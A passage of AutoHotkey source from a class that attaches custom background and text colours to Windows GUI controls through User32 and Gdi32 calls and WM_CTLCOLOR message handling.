Static NullBrush := DllCall("GetStockObject", "Int", 5, "UPtr")
Static SYSCOLORS := {Edit: "", ListBox: "", Static: ""}
Static ErrorMsg := ""
Static InitClass := classGuiColors.ClassInit()
__New() {
If (This.InitClass == "!DONE!") {
This["!Access_Denied!"] := True
Return False
}
}
__Delete() {
If This["!Access_Denied!"]
Return
This.Free()
}
ClassInit() {
classGuiColors := New classGuiColors
Return "!DONE!"
}
CheckBkColor(ByRef BkColor, Class) {
This.ErrorMsg := ""
If (BkColor != "") && !This.HTML.HasKey(BkColor) && !RegExMatch(BkColor, "^[[:xdigit:]]{6}$") {
This.ErrorMsg := "Invalid parameter BkColor: " . BkColor
Return False
}
BkColor := BkColor = "" ? This.SYSCOLORS[Class]
: This.HTML.HasKey(BkColor) ? This.HTML[BkColor]
: "0x" . SubStr(BkColor, 5, 2) . SubStr(BkColor, 3, 2) . SubStr(BkColor, 1, 2)
Return True
}
CheckTxColor(ByRef TxColor) {
This.ErrorMsg := ""
If (TxColor != "") && !This.HTML.HasKey(TxColor) && !RegExMatch(TxColor, "i)^[[:xdigit:]]{6}$") {
This.ErrorMsg := "Invalid parameter TextColor: " . TxColor
Return False
}
TxColor := TxColor = "" ? ""
: This.HTML.HasKey(TxColor) ? This.HTML[TxColor]
: "0x" . SubStr(TxColor, 5, 2) . SubStr(TxColor, 3, 2) . SubStr(TxColor, 1, 2)
Return True
}
Attach(HWND, BkColor, TxColor := "") {
Static ClassNames := {Button: "", ComboBox: "", Edit: "", ListBox: "", Static: ""}
Static BS_CHECKBOX := 0x2, BS_RADIOBUTTON := 0x8
Static ES_READONLY := 0x800
Static COLOR_3DFACE := 15, COLOR_WINDOW := 5
If (This.SYSCOLORS.Edit = "") {
This.SYSCOLORS.Static := DllCall("User32.dll\GetSysColor", "Int", COLOR_3DFACE, "UInt")
This.SYSCOLORS.Edit := DllCall("User32.dll\GetSysColor", "Int", COLOR_WINDOW, "UInt")
This.SYSCOLORS.ListBox := This.SYSCOLORS.Edit
}
This.ErrorMsg := ""
If (BkColor = "") && (TxColor = "") {
This.ErrorMsg := "Both parameters BkColor and TxColor are empty!"
Return False
}
If !(CtrlHwnd := HWND + 0) || !DllCall("User32.dll\IsWindow", "UPtr", HWND, "UInt") {
This.ErrorMsg := "Invalid parameter HWND: " . HWND
Return False
}
If This.Attached.HasKey(HWND) {
This.ErrorMsg := "Control " . HWND . " is already registered!"
Return False
}
Hwnds := [CtrlHwnd]
Classes := ""
WinGetClass, CtrlClass, ahk_id %CtrlHwnd%
This.ErrorMsg := "Unsupported control class: " . CtrlClass
If !ClassNames.HasKey(CtrlClass)
Return False
ControlGet, CtrlStyle, Style, , , ahk_id %CtrlHwnd%
If (CtrlClass = "Edit")
Classes := ["Edit", "Static"]
Else If (CtrlClass = "Button") {
IF (CtrlStyle & BS_RADIOBUTTON) || (CtrlStyle & BS_CHECKBOX)
Classes := ["Static"]
Else
Return False
}
Else If (CtrlClass = "ComboBox") {
VarSetCapacity(CBBI, 40 + (A_PtrSize * 3), 0)
NumPut(40 + (A_PtrSize * 3), CBBI, 0, "UInt")
DllCall("User32.dll\GetComboBoxInfo", "Ptr", CtrlHwnd, "Ptr", &CBBI)
Hwnds.Insert(NumGet(CBBI, 40 + (A_PtrSize * 2, "UPtr")) + 0)
Hwnds.Insert(Numget(CBBI, 40 + A_PtrSize, "UPtr") + 0)
Classes := ["Edit", "Static", "ListBox"]
}
If !IsObject(Classes)
Classes := [CtrlClass]
If (BkColor <> "Trans")
If !This.CheckBkColor(BkColor, Classes[1])
Return False
If !This.CheckTxColor(TxColor)
Return False
For I, V In Classes {
If (This.HandledMessages[V] = 0)
OnMessage(This.WM_CTLCOLOR[V], This.MessageHandler)
This.HandledMessages[V] += 1
}
If (BkColor = "Trans")
Brush := This.NullBrush
Else
Brush := DllCall("Gdi32.dll\CreateSolidBrush", "UInt", BkColor, "UPtr")
For I, V In Hwnds
This.Attached[V] := {Brush: Brush, TxColor: TxColor, BkColor: BkColor, Classes: Classes, Hwnds: Hwnds}
DllCall("User32.dll\InvalidateRect", "Ptr", HWND, "Ptr", 0, "Int", 1)
This.ErrorMsg := ""
Return True
}
Change(HWND, BkColor, TxColor := "") {
This.ErrorMsg := ""
HWND += 0
If !This.Attached.HasKey(HWND)
Return This.Attach(HWND, BkColor, TxColor)
CTL := This.Attached[HWND]
If (BkColor <> "Trans")
If !This.CheckBkColor(BkColor, CTL.Classes[1])
Return False
If !This.CheckTxColor(TxColor)
Return False
If (BkColor <> CTL.BkColor) {
If (CTL.Brush) {
If (Ctl.Brush <> This.NullBrush)
DllCall("Gdi32.dll\DeleteObject", "Prt", CTL.Brush)
This.Attached[HWND].Brush := 0
}
If (BkColor = "Trans")
Brush := This.NullBrush
Else
Brush := DllCall("Gdi32.dll\CreateSolidBrush", "UInt", BkColor, "UPtr")
For I, V In CTL.Hwnds {
This.Attached[V].Brush := Brush
This.Attached[V].BkColor := BkColor
}
}
For I, V In Ctl.Hwnds
This.Attached[V].TxColor := TxColor
This.ErrorMsg := ""
DllCall("User32.dll\InvalidateRect", "Ptr", HWND, "Ptr", 0, "Int", 1)
Return True
}
Detach(HWND) {
This.ErrorMsg := ""
HWND += 0
If This.Attached.HasKey(HWND) {
CTL := This.Attached[HWND].Clone()
If (CTL.Brush) && (CTL.Brush <> This.NullBrush)
DllCall("Gdi32.dll\DeleteObject", "Prt", CTL.Brush)
For I, V In CTL.Classes {
If This.HandledMessages[V] > 0 {
This.HandledMessages[V] -= 1
If This.HandledMessages[V] = 0
OnMessage(This.WM_CTLCOLOR[V], "")
} }
For I, V In CTL.Hwnds
This.Attached.Remove(V, "")
DllCall("User32.dll\InvalidateRect", "Ptr", HWND, "Ptr", 0, "Int", 1)
CTL := ""
Return True
}
This.ErrorMsg := "Control " . HWND . " is not registered!"
Return False
}
Free() {
For K, V In This.Attached
If (V.Brush) && (V.Brush <> This.NullBrush)
DllCall("Gdi32.dll\DeleteObject", "Ptr", V.Brush)
For K, V In This.HandledMessages
If (V > 0) {
OnMessage(This.WM_CTLCOLOR[K], "")
This.HandledMessages[K] := 0
}
This.Attached := {}
Return True
}
IsAttached(HWND) {
Return This.Attached.HasKey(HWND)
}
}
classGuiColors_OnMessage(HDC, HWND) {
Critical
If classGuiColors.IsAttached(HWND) {
CTL := classGuiColors.Attached[HWND]
If (CTL.TxColor != "")
DllCall("Gdi32.dll\SetTextColor", "Ptr", HDC, "UInt", CTL.TxColor)
If (CTL.BkColor = "Trans")
DllCall("Gdi32.dll\SetBkMode", "Ptr", HDC, "UInt", 1)
Else
DllCall("Gdi32.dll\SetBkColor", "Ptr", HDC, "UInt", CTL.BkColor)
Return CTL.Brush
}
}
CreateGui()
Return